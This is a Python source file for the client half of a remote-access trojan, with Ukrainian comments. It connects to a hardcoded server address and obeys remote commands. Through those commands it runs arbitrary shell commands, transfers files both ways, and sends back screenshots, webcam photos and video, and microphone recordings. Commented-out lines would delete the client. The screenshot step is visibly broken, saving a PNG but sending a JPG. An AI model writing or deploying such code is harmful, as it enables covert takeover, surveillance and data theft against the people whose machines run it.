# Client side
import os
import sys
import socket
import platform
import subprocess
import pyautogui
import cv2
import sounddevice as sd
from scipy.io import wavfile
from time import sleep

HOST = "192.168.50.48"  # Ім'я хоста або IP-адрес сервера
PORT = 25254  # Порт, який використовувається сервером для встановлення з'єднання


def gen(command):
    output = subprocess.getoutput(command)
    directory = os.getcwd()
    msg = f"{output}{'<bober>'}{directory}"
    sock.send(msg.encode())

def download(socket, filename):
    if os.path.isfile(filename):
        file_size = os.path.getsize(filename)
        print(file_size)
        socket.send(f"exist<bober>{file_size}".encode())
        file = open(filename, "rb")
        # data = socket.recv(buffer_size)
        while True:
            bytes_read = file.read(BUFFER_SIZE_I)
            if not bytes_read:
                sleep(3)
                socket.send("end".encode())
                break
            socket.sendall(bytes_read)
    else:
        socket.send("not exist".encode())

def upload(socket, filename):
    file = open(filename, "wb")
    while True:
        data = socket.recv(BUFFER_SIZE_I)
        if data.decode() == "end":
            break
        file.write(data)

def video():
    cap = cv2.VideoCapture(0)
    fps = 20.0
    image_size = (640, 480)
    video_file = "video.avi"
    out = cv2.VideoWriter(video_file, cv2.VideoWriter_fourcc(*"XVID"), fps, image_size)
    i = 0
    while True:
        ret, frame = cap.read()
        out.write(frame)
        sleep(0.05)
        i = i + 1
        if i > 100:
            break
    cap.release()
    cv2.destroyAllWindows()


BUFFER_SIZE = 1024 * 128
BUFFER_SIZE_I: int = 4096

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))
directory = os.getcwd()
client_os = platform.system()
msg = f"{client_os}{'<bober>'}{directory}"
sock.send(msg.encode())
while True:
    command = sock.recv(1024).decode()
    if command.upper() == "EXIT":
        # sock.send("Зразок клієнта був видалений ^_^".encode())  # Надсилання інформації серверу
        # os.remove("./client_copy.py")  # Самознищення зразка клієнстької частини
        break
    temp = command.split(" ", 1)
    if temp[0].upper() == "CD":
        try:
            os.chdir(" ".join(temp[1:]))
        except FileNotFoundError as error:
            msg = str(error)
            sock.send(msg.encode())
            continue
    if temp[0].upper() == "DOWNLOAD":
        filename = temp[1]
        download(sock, filename)
        continue
    if temp[0].upper() == "UPLOAD":
        filename = temp[1]
        upload(sock, filename)
        continue
    if temp[0].upper() == "SCREENSHOT":
        image = pyautogui.screenshot("screenshot.png")
        sock.send("screenshot.jpg".encode())
        download(sock, "screenshot.jpg")
        os.remove("screenshot.jpg")
        continue
    if temp[0].upper() == "PHOTO":
        cap = cv2.VideoCapture(0)
        for i in range(45):
            cap.read()
        ret, frame = cap.read()
        cv2.imwrite("photo.jpg", frame)
        cap.release()
        sock.send("photo.jpg".encode())
        download(sock, "photo.jpg")
        os.remove("photo.jpg")
        continue
    if temp[0].upper() == "VIDEO":
        video()
        sock.send("video.avi".encode())
        download(sock, "video.avi")
        os.remove("video.avi")
        continue
    if temp[0].upper() == "AUDIO":
        fs = 44100
        seconds = 10
        record = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        wavfile.write("audio.wav", fs, record)
        sock.send("audio.wav".encode())
        download(sock, "audio.wav")
        os.remove("audio.wav")
        continue
    gen(command)

sock.close()
